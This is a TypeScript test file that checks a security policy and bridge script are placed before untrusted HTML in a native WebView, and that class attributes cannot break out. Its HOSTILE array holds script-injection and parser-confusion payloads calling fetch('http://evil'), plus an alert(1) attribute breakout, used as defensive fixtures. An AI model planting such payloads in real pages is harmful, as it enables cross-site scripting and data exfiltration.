import { describe, expect, test } from "bun:test";
import { artifactDocument, policyFirstDocument, webViewDocument } from "@godmode/shared";

const POLICY = `<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`;
const OPEN = `<!doctype html><html><head><meta charset="utf-8">${POLICY}`;

const HOSTILE = [
  "<title><head></title><script>fetch('http://evil')</script>",
  "<script>fetch('http://evil')</script><!doctype html><html><head></head><body></body></html>",
  "<!-- <head> --><script>fetch('http://evil')</script><head></head>",
  "<textarea><head></textarea><script>fetch('http://evil')</script>",
  "<script>fetch('http://evil')</script>",
  "<plaintext><head>",
  "</head></html><script>fetch('http://evil')</script>",
];

describe("a document for a native WebView", () => {
  test("the shared regex can be fooled: it puts the policy inside a title, or after a script", () => {
    expect(artifactDocument(HOSTILE[0]!, POLICY)).toContain(`<title><head>${POLICY}`);
    const late = artifactDocument(HOSTILE[1]!, POLICY);
    expect(late.indexOf("fetch(")).toBeLessThan(late.indexOf(POLICY));
  });

  test("the policy and the bridge come before every byte of the page, whatever the page holds", () => {
    for (const html of HOSTILE) {
      const doc = policyFirstDocument(html, POLICY);
      expect(doc.startsWith(OPEN)).toBe(true);
      expect(doc.indexOf(html)).toBeGreaterThan(OPEN.length);
    }
  });

  test("a fragment gets a body, a page brings its own", () => {
    expect(policyFirstDocument("<div>hi</div><script>document.body.id='x'</script>", POLICY)).toBe(`${OPEN}</head><body><div>hi</div><script>document.body.id='x'</script></body>`);
    expect(policyFirstDocument("<!doctype html><html lang=\"de\"><head></head><body>hi</body></html>", POLICY).endsWith("</head><!doctype html><html lang=\"de\"><head></head><body>hi</body></html>")).toBe(true);
    expect(policyFirstDocument("<!-- <body> --><p>hi</p>", POLICY)).toContain("</head><body><!-- <body> -->");
  });

  test("an artifact's policy, relay and bridge run before the page, with its own <html> class kept", () => {
    const doc = webViewDocument(`<script>one()</script><html class="h-full md:flex"><head><title>x</title></head><body>hi</body></html>`, "tok", { a: 1 }, "dark");
    const page = doc.indexOf("<script>one()");
    expect(doc.startsWith(`<!doctype html><html><head><meta charset="utf-8"><meta name="viewport"`)).toBe(true);
    for (const part of [`http-equiv="Content-Security-Policy"`, "ReactNativeWebView", "window.godmode=g"]) expect(doc.indexOf(part)).toBeLessThan(page);
    expect(doc.indexOf(`classList.add(...["h-full","md:flex"])`)).toBeLessThan(doc.indexOf("window.godmode=g"));
  });

  test("only plain classes are carried over: nothing a page can break out of", () => {
    const doc = webViewDocument(`<html class="a');alert(1)//"><body>hi</body></html>`, "tok", null, "light");
    expect(doc).not.toContain("classList.add(...");
    expect(webViewDocument(`<title><html class="x"></title>`, "tok", null, "light")).toContain(`classList.add(...["x"])`);
  });
});
